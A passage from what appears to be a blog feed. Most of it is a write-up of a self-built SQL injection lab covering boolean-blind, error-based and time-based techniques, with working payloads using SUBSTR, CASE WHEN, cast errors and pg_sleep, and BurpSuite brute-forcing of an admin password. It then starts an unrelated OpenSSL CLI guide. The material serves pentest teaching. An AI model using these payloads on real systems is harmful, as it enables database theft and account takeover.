&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/20.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/21.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This time the result of the query can not be seen within the HTTP response. Regardless, the backend still vulnerable for injection.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/22.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is possible to extract data with &lt;strong&gt;AND&lt;/strong&gt; keyword in this keys.&lt;/p&gt;

&lt;p&gt;The following query will find the product with the id of 1 if 1=1. Since
1 equals to 1, product will be found.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The following query will find the product with the id of 1 if 1=2. Since
1 is not equal to 2, database won’t return any product.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Launch &lt;strong&gt;BurpSuite&lt;/strong&gt;.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/26.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/27.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/28.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/29.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This behaviour opens up a door. One can observe that there are two different responses depending on
the validness of the right side of the query.&lt;/p&gt;

&lt;p&gt;With the help of the &lt;strong&gt;SUBSTR()&lt;/strong&gt; function, a subquery can be written.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SUBSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tables&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;some table name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;some table name&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;SELECT method will return the table name of the queried table and compare it with our guess.&lt;/p&gt;

&lt;p&gt;If there is a table called &lt;strong&gt;some table name&lt;/strong&gt;, it will be equal to &lt;strong&gt;some table name&lt;/strong&gt;, the condition will be
&lt;strong&gt;true&lt;/strong&gt;. However, if there is not any table with that name, query will return empty string, 
since an empty string is not equal to some unempty string value, the condition will be &lt;strong&gt;false&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;TRUE AND TRUE = Product exists&lt;br /&gt;
TRUE AND FALSE = Product does not exists.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/31.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/32.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/33.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/34.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, find column names of the &lt;strong&gt;users&lt;/strong&gt; table.
The number of rows which will be returned should be limited to a single row since the SUBSTR() method can only compare a single string 
value with another. Therefore, database have to return only the first row of the query result, which is the first column name of 
the &lt;strong&gt;users&lt;/strong&gt; table. If there would not any prior knowledge about the database, all the permutations had to be brute-forced. 
It can be done with the &lt;strong&gt;Cluster Bomb&lt;/strong&gt;  utility in &lt;strong&gt;BurpSuite&lt;/strong&gt;.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/41.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/42.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/39.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/40.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/43.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
It is validated that there is a row called &lt;strong&gt;username&lt;/strong&gt; in the &lt;strong&gt;users&lt;/strong&gt; table.&lt;/p&gt;

&lt;p&gt;Let’s see if there is an admin user.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/44.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/75.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is verified that there is an admin user. However, it is not possible to guess the
password. The characters of the password must be brute-forced one by one.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/46.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/47.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is not practical to do it manually. Therefore, it is best to use an automated brute-force attack tool.
In this case a &lt;strong&gt;Sniper&lt;/strong&gt; attack would do the job which is an &lt;strong&gt;Intruder&lt;/strong&gt; utility exists in BurpSuite.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/52.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
First character is &lt;strong&gt;c&lt;/strong&gt;. 
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/53.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/54.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/55.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
Second character is &lt;strong&gt;o&lt;/strong&gt;. 
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/56.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By doing the same attack for each character, we can find the password is ‘cokgizlisifre’ eventually.&lt;/p&gt;

&lt;h2 id=&quot;error-based-sqli-1&quot;&gt;Error-Based SQLi&lt;/h2&gt;

&lt;p&gt;There are two different &lt;strong&gt;Error-Based SQLi&lt;/strong&gt; types.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Static Error Message/Boolean-Based: Seeing the same error message each time for all kind of errors.&lt;/li&gt;
  &lt;li&gt;Dynamic Error Message/In-Band: Seeing the exact database error log within the HTTP response.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;static-error-messageboolean-based&quot;&gt;Static Error Message/Boolean-Based&lt;/h3&gt;

&lt;p&gt;What if the the endpoint does not behave any differently whether or not the query is successfull or not?
In this case it is not possible extract any data by observing the behaviour of the application.
Let’s see the altered code.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/59.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
As you can see endpoint is embedding the same response in HTTP response. When this is the case,
we use another SQLi techique, which is called &lt;strong&gt;Error Based SQLi&lt;/strong&gt;. Practically, we inject an illegitimate 
sql query which will force the application to spawn an error. The point is to create our own conditional response.&lt;/p&gt;

&lt;p&gt;First let’s see how the API behaves naturally.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/57.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/58.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We should test whether the application behaves accordingly when it receives an illegitimate parameter to query.
General rule of thumb is to trigger a &lt;strong&gt;division by zero&lt;/strong&gt; error. No database can divide an integer to zero (it is not possible in algebra).
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/60.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/61.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this case the application does not manage the error gracefully, therefore we generated our own conditional response.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CASE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHEN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;THEN&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;illegitimate subquery here&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ELSE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;END&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;When the &lt;strong&gt;CASE&lt;/strong&gt; condition is met, in this case if 3=2, we will trigger an error by injecting an illegitimate subquery, else
&lt;strong&gt;CASE&lt;/strong&gt; will select 1. When the &lt;strong&gt;CASE&lt;/strong&gt; keyword selects the &lt;strong&gt;ELSE&lt;/strong&gt; block, which is 1. Finally, this is how the right side of 
the query will look like;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;No errors.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;However when we inject it like this;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CASE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHEN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;THEN&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;illegitimate subquery here&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ELSE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;END&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Since 3 is equal to 3, it will execute the &lt;strong&gt;THEN&lt;/strong&gt; block, and try to execute an illegitimate subquery.
That query will return the error page.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The illegitimate payload we will use in this example will be;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;cAsT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;vErSiOn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;aS&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nUmeRiC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It is not possible for database to cast &lt;strong&gt;CHARACTER&lt;/strong&gt; type value as numeric. Therefore, it will generate an error.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; There are tons of payloads for error-based-sqli and for other types online, the ones I am using for
demonstration purposes.&lt;/p&gt;

&lt;p&gt;Instead of testing if 3=3 or 3=2, &lt;strong&gt;CASE WHEN&lt;/strong&gt; block will test if a certain named table exists or not by using &lt;strong&gt;SUBSTR()&lt;/strong&gt;
function, same as how we did for &lt;strong&gt;Conditional SQLi&lt;/strong&gt; above.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/76.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/77.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
Since the condition does not met, no error message have generated by the database.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/78.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/79.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
Since the condition is met, error message have generated by the database.&lt;/p&gt;

&lt;p&gt;Let’s further extract data from the database by using this technique with altering the payload.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/68.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/69.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/70.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/71.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/72.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/74.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dynamic-error-messagein-band&quot;&gt;Dynamic Error Message/In-Band&lt;/h3&gt;

&lt;p&gt;The application might return the exact databse error in the HTTP response message. It is easier to extract data
from that kind of implementation since it is an in-band vulnerability.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/89.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/80.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/81.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/82.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/83.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/84.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/85.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/86.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/87.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;SUBSTRING()&lt;/strong&gt; can be used for further exploitation same as before after this point.&lt;/p&gt;

&lt;h2 id=&quot;inferential-blind-sqlitime-based&quot;&gt;Inferential-Blind SQLi/Time-Based&lt;/h2&gt;

&lt;p&gt;What if the endpoint responding the same even if every method explained above had been tried?
&lt;br /&gt;This is the implementation:
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/88.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The application will return the same string for each scenario. However, it is still vulnerable for SQLi.
Data still can be extracted by using &lt;strong&gt;Time-Based SQLi&lt;/strong&gt; methods.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The endpoint executes the query and sending the response synchronously &lt;a href=&quot;https://www.geeksforgeeks.org/difference-between-synchronous-and-asynchronous-method-of-fs-module/&quot;&gt;&lt;strong&gt;(See synch/asynch)&lt;/strong&gt;&lt;/a&gt;.
Which means that, the response will be sent after the query is completed.&lt;br /&gt;&lt;br /&gt;
&lt;strong&gt;Note:&lt;/strong&gt; The client.query() block is asynchron for the rest of the code, which means it is going to be executed in a seperate thread.
However, request-query-response cycle has a  blocking structure, therefore synchronous in itself.&lt;/p&gt;

&lt;p&gt;Expected response:
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/89.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Conditional triggering using &lt;strong&gt;SELECT CASE&lt;/strong&gt; structure.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CASE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHEN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;THEN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pg_sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;END&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Database will sleep for three seconds after the first query
is completed if the condition of the second one is met. Therefore, it is now possible to extract data from the database by triggering time delays.
Response time will be different accordingly whether the condition is met or not.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/90.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/91.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Combining time triggering and conditionals, further exploitation can be done same as how it had been done at the examples above.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/92.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/93.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/94.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/95.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;out-of-band-sqli-1&quot;&gt;Out-Of-Band SQLi&lt;/h2&gt;

&lt;p&gt;Application might run the query asynchronously. Or endpoint can pass the parameter to another microservice to run the sql query.
Regardless of which, it is not possible to use time-based technique, since application would not wait for sql query to
complete in order to respond to the client.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/sqlilab/88.png&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you see, the application will return the same string for each scenario. However, it is still vulnerable for SQLi.
We can still extract data by using &lt;strong&gt;OOB&lt;/strong&gt; methods.&lt;br /&gt;
Out-of-Band means triggering an interaction from database to an outer network by using some network protocol. DNS is
a good fit for that purpose since services, including all the database services, needs to resolve the IP address 
of a given domain name.&lt;/p&gt;
</description>
        <pubDate>Sun, 21 Aug 2022 21:59:35 +0000</pubDate>
        <link>http://localhost:4000/2022/08/21/sql-injection-lab/</link>
        <guid isPermaLink="true">http://localhost:4000/2022/08/21/sql-injection-lab/</guid>
        
        <category>Pentesting</category>
        
        <category>sql-injection</category>
        
        
      </item>
    
      <item>
        <title>OpenSSL CLI Tool</title>
        <description>&lt;h1 id=&quot;1-introduction&quot;&gt;1-INTRODUCTION&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;OpenSSL&lt;/em&gt;&lt;/strong&gt; is a command-line utility that facilitates cryptographic operations such as symmetric or asymmetric encryption, public-key
cryptography, hash functions, digital signatures etc. You can download the source code from &lt;a href=&quot;http://www.openssl.org/&quot;&gt;http://www.openssl.org&lt;/a&gt;.
This guide will cover just the basic functionalities of the OpenSSL.
&lt;br /&gt;&lt;br /&gt;After the installation check for the version.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl version
OpenSSL 1.1.1m  14 Dec 2021&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;
OpenSSL contains various commands. Here is the list of them.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl &lt;span class=&quot;nb&quot;&gt;help
&lt;/span&gt;Standard commands
asn1parse         ca                ciphers           cms               
crl               crl2pkcs7         dgst              dhparam           
dsa               dsaparam          ec                ecparam           
enc               engine            errstr            gendsa            
genpkey           genrsa            &lt;span class=&quot;nb&quot;&gt;help              &lt;/span&gt;list              
nseq              ocsp              passwd            pkcs12            
pkcs7             pkcs8             pkey              pkeyparam         
pkeyutl           prime             rand              rehash            
req               rsa               rsautl            s_client          
s_server          s_time            sess_id           smime             
speed             spkac             srp               storeutl          
ts                verify            version           x509 &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Brief descriptions for some parameters:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ca&lt;/strong&gt;: Create certificate authorities.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;dgst&lt;/strong&gt;: Compute hash functions.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;enc&lt;/strong&gt;: Encryption/decryption via secret key algorithms such as a secret key stored in a file or using a password.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;genrsa&lt;/strong&gt;: Create a pair of private/public keys by using the RSA algorithm.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;password&lt;/strong&gt;: “Hashed password” generator.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;pkcs7&lt;/strong&gt;: Management tools for PKCS#7 standard.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;pkcs12&lt;/strong&gt;: Management tools for PKCS#12 standard.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;rsa&lt;/strong&gt;: Data management for RSA.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;rsautl&lt;/strong&gt;: Sign/Verif a digital signature or encrypt/decrypt with RSA.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;rand&lt;/strong&gt;: Pseudo-random bit string generator.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;verify&lt;/strong&gt;: X.509 digital certificate verifier.&lt;/li&gt;
